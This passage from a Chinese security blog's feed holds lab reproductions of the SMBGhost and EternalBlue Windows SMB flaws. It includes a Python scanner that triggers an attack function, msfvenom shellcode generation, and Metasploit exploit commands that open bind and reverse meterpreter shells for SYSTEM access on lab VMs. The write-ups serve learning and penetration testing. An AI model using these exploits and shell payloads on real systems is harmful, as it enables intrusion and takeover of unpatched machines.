string\">b'\\x00\\x00\\x00\\xc0\\xfeSMB@\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00$\\x00\\x08\\x00\\x01\\x00\\x00\\x00\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00x\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x02\\x10\\x02\"\\x02$\\x02\\x00\\x03\\x02\\x03\\x10\\x03\\x11\\x03\\x00\\x00\\x00\\x00\\x01\\x00&amp;\\x00\\x00\\x00\\x00\\x00\\x01\\x00 \\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\n\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00'</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    <span class=\"token keyword\">for</span> ip <span class=\"token keyword\">in</span> IPNetwork<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        sock <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        sock<span class=\"token punctuation\">.</span>settimeout<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>            sock<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">445</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>            sock<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>        sock<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>pkt<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>        nb<span class=\"token punctuation\">,</span> <span class=\"token operator\">=</span> struct<span class=\"token punctuation\">.</span>unpack<span class=\"token punctuation\">(</span><span class=\"token string\">\">I\"</span><span class=\"token punctuation\">,</span> sock<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>        res <span class=\"token operator\">=</span> sock<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>        <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">[</span><span class=\"token number\">68</span><span class=\"token punctuation\">:</span><span class=\"token number\">70</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">b\"\\x11\\x03\"</span> <span class=\"token keyword\">or</span> res<span class=\"token punctuation\">[</span><span class=\"token number\">70</span><span class=\"token punctuation\">:</span><span class=\"token number\">72</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token string\">b\"\\x02\\x00\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>ip<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> Not vulnerable.\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>            darkness_attack<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>ip<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> Vulnerable\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>scanner<span class=\"token punctuation\">(</span><span class=\"token string\">'192.168.232.132'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    <span class=\"token comment\"># if len(sys.argv) != 2:</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    <span class=\"token comment\">#     exit(\"[-] Usage: &#123;&#125; target_ip\".format(sys.argv[0]))</span></pre></td></tr></table></figure><p>测试成功<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/28/pPb2itS.png\" alt=\"\" /></p>\n<h3 id=\"4开始利用rce\"><a class=\"anchor\" href=\"#4开始利用rce\">#</a> 4. 开始利用 RCE</h3>\n<p>利用前面准备好的 <code>SMBGhost_RCE_PoC</code> <br />\n 这里我们需要利用 msf 中的 <code>msfvenom</code>  生成 <code>shellcode</code>  对上面的 poc 进行修改</p>\n<p>1. 生成 shellcode（这里设置开启 5555 端口）：<br />\n命令：<br />\nmsfvenom -p windows/x64/meterpreter/bind_tcp lport=5555 -f py -o shellcode.txt<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/28/pPb2N0x.png\" alt=\"\" /></p>\n<p>shellcode 文件：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/28/pPb2U76.png\" alt=\"\" /></p>\n<p>这里需要将 <code>buf</code>  修改位 <code>USER_PAYLOAD</code>  为了使在 poc 中替换的 <code>shellcode关键字相同</code> ，可以利用脚本来一键替换</p>\n<p>替换成功：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/28/pPb2scd.png\" alt=\"\" /></p>\n<p>2. 修改 <code>SMBGhost_RCE_PoC</code>  内 <code>exploit</code>  的 shellcode</p>\n<p>这里修改完成<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/28/pPb2cnI.png\" alt=\"\" /></p>\n<p>3. 使用 msf 开启监听<br />\n（前面在永恒之蓝漏洞已经用过这些命令，了解了对应功能）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/28/pPb259g.png\" alt=\"\" /></p>\n<p>4. 执行 exp</p>\n<p><code>python3 exploit.py -ip 192.168.232.132</code></p>\n<p>运行成功（此次尝试了多次，有时 win10 会直接蓝屏以及 msf 监听没有回显）：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/28/pPbRr5T.png\" alt=\"\" /></p>\n<p>查看权限，看见已经是 system 用户</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/28/pPbRgxJ.png\" alt=\"\" /></p>\n<p>创建一个 cumt 文件并上传到 c 盘：<br />\n<img data-src=\"https://img1.imgtp.com/2023/09/28/kciLnT3p.png\" alt=\"\" /></p>\n<p>进入 win10 主机查看一下<br />\n<img data-src=\"https://img1.imgtp.com/2023/09/28/nl4eh824.png\" alt=\"\" /><br />\n<img data-src=\"https://img1.imgtp.com/2023/09/28/GfgvCSw1.png\" alt=\"\" /></p>\n<p>到此永恒之黑漏洞就复现完毕</p>\n",
            "tags": [
                "windows",
                "渗透"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/17/windows/win7%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "https://vvwwvv.cn/2023/09/17/windows/win7%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "Windows7永恒之蓝漏洞复现",
            "date_published": "2023-09-17T00:39:56.000Z",
            "content_html": "<h1 id=\"利用msf渗透攻击win7永恒之蓝漏洞-ms17-010\"><a class=\"anchor\" href=\"#利用msf渗透攻击win7永恒之蓝漏洞-ms17-010\">#</a> 利用 msf 渗透攻击 win7（永恒之蓝漏洞 ms17-010）</h1>\n<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>永恒之蓝是指 2017 年 4 月 14 日晚，黑客团体 Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含 “永恒之蓝” 工具，“永恒之蓝” 利用 Windows 系统的 SMB 漏洞可以获取系统最高权限。5 月 12 日，不法分子通过改造 “永恒之蓝” 制作了 wannacry 勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p>\n<p>存在漏洞的主机，只需要开放 445 端口即可被攻击，获取系统最高权限</p>\n<h2 id=\"环境\"><a class=\"anchor\" href=\"#环境\">#</a> 环境</h2>\n<p>kali  ip：192.168.232.129</p>\n<p>windows7   ip：192.168.232.131</p>\n<h2 id=\"工具\"><a class=\"anchor\" href=\"#工具\">#</a> 工具</h2>\n<p>Metasploit Framework (MSF) 是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit 可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以 “可以黑掉整个宇宙” 之名。刚开始的 Metasploit 是采用 Perl 语言编写的，但是再后来的新版中，改成了用 Ruby 语言编写的了。在 kali 中，自带了 Metasploit 工具。</p>\n<h2 id=\"ms17-010漏洞复现\"><a class=\"anchor\" href=\"#ms17-010漏洞复现\">#</a> ms17-010 漏洞复现</h2>\n<p>1. 安装 win7 并查看本机 ip<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfLpc9.png\" alt=\"\" /></p>\n<p>kali 利用 nmap 扫描 win7ip<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfLEtO.png\" alt=\"\" /></p>\n<p>发现开启了 445 端口，利用该端口进行攻击</p>\n<p>2. 启动 msf 进行漏洞探测</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#利用命令</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tmsfconsole  <span class=\"token comment\">#进入 msf</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tsearch ms17-010 <span class=\"token comment\">#查找 msf17-010 漏洞模块</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/17/pPfXXAP.png\" alt=\"\" /><br />\n利用 use [对应的模块序号]  命令即可查看对应漏洞模块</p>\n<p>为了使用 <code>scanner</code>  模块，这里我们输入  <code>use 3</code>  接着输入 <code>info</code>  命令来查看 ms17-010 漏洞信息<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfjnc4.png\" alt=\"\" /></p>\n<p>接下来使用 <code>scanner</code>  模块检测主机是否存在漏洞</p>\n<p>输入命令 <code>show options</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfjwDA.png\" alt=\"\" /><br />\n 在上面的图里可以看到 <code>Required</code>  为是否需要参数， <code>yes</code>  表示需要参数，若改选项对应参数为空则需要我们来输入参数</p>\n<p>发现 <code>RHOST</code>  参数对应为空，其参数是被攻击主机的 IP，需要我们输入</p>\n<p>输入命令 <code>set rhosts 192.168.232.131</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfjIU0.png\" alt=\"\" /></p>\n<p>再次输入 <code>show options</code> , 可以看到已经设置好了 <code>RHOSTS</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfjqv4.png\" alt=\"\" /></p>\n<p>使用 <code>run</code>  命令进行扫描攻击，运行结果显示可能会遭受 <code>ms17-010</code>  攻击<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfvC8O.png\" alt=\"\" /></p>\n<p>3. 漏洞利用</p>\n<p>回到开始选择漏洞模块的地方<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfv8qs.png\" alt=\"\" /></p>\n<p>输入 <code>use 0</code>  来选择 <code>永恒之蓝</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfvdRU.png\" alt=\"\" /></p>\n<p>输入 <code>set payload windows/x64/meterpreter/reverse_tcp</code>  来设置 payload 的连接方式，使我们的 win7 主动发起连接，通过这种方式拿到权限<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfzV4P.png\" alt=\"\" /></p>\n<p>接下来需要设置我们的攻击 ip，按顺序输入 <code>show options</code>  和 <code>set rhosts 192.168.232.131</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPfzujg.png\" alt=\"\" /></p>\n<p>接下来使用 <code>run</code>  命令即可执行攻击<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPhPESx.png\" alt=\"\" /></p>\n<p>出现返回的 <code>meterpreter</code>  时我们就得到了 win7 的 system 权限</p>\n<p>【Meterpreter 是 Metasploit 的一个扩展模块，可以调用 Metasploit 的一些功能，<br />\n对目标系统进行更深入的渗透，如获取屏幕、上传 / 下载文件、创建持久后门等。】</p>\n<p><strong>这里进行文件上传的演示</strong></p>\n<p>在 kali 中创建一个文件（cumt.txt）, 编辑内容<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPhAMKP.png\" alt=\"\" /></p>\n<p>在 <code>meterpreter</code>  会话下输入命令  <code>upload cumt.txt c://</code> , 将文件上传到 win7 主机的 C 盘下<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPhAt8s.png\" alt=\"\" /></p>\n<p>查看 win7 主机，发现文件夹中多了一个 cumt.txt 文件，内容确实是我在 kali 中写入的相同<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPhAdK0.png\" alt=\"\" /><br />\n<img data-src=\"https://z1.ax1x.com/2023/09/17/pPhAraF.md.png\" alt=\"\" /></p>\n<p>通过这种方式我们也可以在对应主机里写入木马并上传进行利用</p>\n<p>到此永恒之蓝漏洞就复现完成了</p>\n<p>参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NTMwODE5MTA=\">https://zhuanlan.zhihu.com/p/453081910</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4L2FydGljbGUvZGV0YWlscy8xMDQwNDQwMDI=\">https://blog.csdn.net/qq_44159028/article/details/104044002</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vsc29uSFkvYXJ0aWNsZS9kZXRhaWxzLzEwOTkzOTQyMA==\">https://blog.csdn.net/ElsonHY/article/details/109939420</span></p>\n<p>漏洞原理：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9ncy4zNjAuY24vcG9zdC9uc2EtZXRlcm5hbGJsdWUtc21iLmh0bWwjdG9jLTc3Mg==\">https://blogs.360.cn/post/nsa-eternalblue-smb.html#toc-772</span></p>\n",
            "tags": [
                "windows",
                "渗透"
            ]
        }
    ]
}